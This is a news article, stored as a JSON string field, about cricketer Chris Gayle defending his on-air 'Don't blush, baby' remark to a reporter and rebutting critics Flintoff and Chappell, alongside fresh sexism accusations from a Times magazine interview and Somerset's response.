  "latent_32717": "London - West Indies star Chris Gayle has insisted controversial comments he made to a female television reporter earlier this year were \"just a little fun\" as he turned on critics including Andrew Flintoff and Ian Chappell.\n\nGayle, 36, came under fire for asking Australian broadcaster Mel McLaughlin out on a date in a live television interview during a Big Bash Twenty20 game in January.\n\n\"I wanted to see your eyes for the first time, hopefully we can win this game and then we can have a drink after as well,\" said star batsman Gayle, before adding: \"Don't blush, baby.\"\n\nChappell and Flintoff, former captains of Australia and England respectively, were among those to criticise Gayle's conduct.\n\nBut Gayle, in an extract from his autobiography published in The Times on Monday, said of his remarks during the Melbourne Renegades' match against Hobart Hurricanes: \"I meant it as a joke. I meant it as a little fun.\n\n\"I didn't mean to be disrespectful and I didn't mean it to be taken serious.\"\n\n\"Channel 10's commentary team could be heard laughing in the background... but someone above them clearly decided to step in, and a throwaway comment in a fun format escalates and blows up and within hours it has turned into a major international incident.\"\n\nFlintoff responded on Twitter by saying Gayle had made himself look a \"bit of a chop\".\n\nBut Gayle, in his autobiography, said: \"The only chop Freddie (Flintoff) knows is when he used to bowl short to me and I would chop him past backward point for four.\"\n\nAs for Chappell, Gayle said: \"Ian Chappell, calling for me to banned worldwide, a man who was once convicted of unlawful assault in the West Indies for punching a cricket official.\n\n\"Ian Chappell, how can you ban the Universe Boss? You'd have to ban cricket itself.\"\n\nSaturday saw Gayle facing fresh accusations of sexism following the publication of an interview with female journalist Charlotte Edwardes in The Times magazine.\n\nIn the article, the Jamaican opener boasted of his \"very, very big bat\".\n\nHe also asked Edwardes if she had ever \"had\" a black man and been in a threesome.\n\nThe interview also saw Gayle say women did have equality.\n\n\"Women can do what they want. Jamaican women are very vocal. They will let you know what time is it, for sure,\" he said.\n\nGayle added: \"Women should please their man,\" explaining: \"When he comes home, food is on the table. Serious,\" although if she also works, \"they share\" and it is down to the \"first person home\".\n\nGayle is currently playing for the Royal Challengers Bangalore in the Indian Premier League Twenty20 competition.\n\nHe is also due to play for Somerset in English cricket's domestic T20 Blast event, having enjoyed a successful spell with the south-west county in 2015.\n\nSomerset chief executive Guy Lavender, responding to the Edwardes interview, said: \"We were disappointed to read the report in The Times (magazine).\n\n\"Our experience of Chris was very positive when he was with us last season, both on and off the pitch.\n\n\"We haven't had the opportunity to discuss this with him yet, but will of course do so when he arrives to play for us in a few days' time.\""
